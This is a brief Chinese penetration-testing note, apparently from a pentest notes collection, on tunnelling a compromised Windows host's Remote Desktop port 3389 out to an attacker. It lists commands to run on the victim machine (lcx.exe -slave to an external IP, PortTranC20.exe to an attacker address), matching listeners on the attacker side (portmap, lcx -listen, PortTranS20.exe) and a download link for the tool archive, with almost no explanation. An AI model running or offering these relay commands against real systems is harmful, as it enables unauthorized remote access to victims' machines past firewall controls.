	使用条件：服务器通外网，拥有自己的公网ip
	靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389
	linux攻击机：./portmap -m 2 -p1 9999 -p2 33889
	windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889
	PortTran
	https://github.com/k8gege/K8tools/raw/master/PortTran.rar
	攻击机执行
	>PortTranS20.exe 12345 389
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/163.png)

	靶机执行
	>PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345
	建立连接后，攻击机连接本机389端口即可
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/164.png)
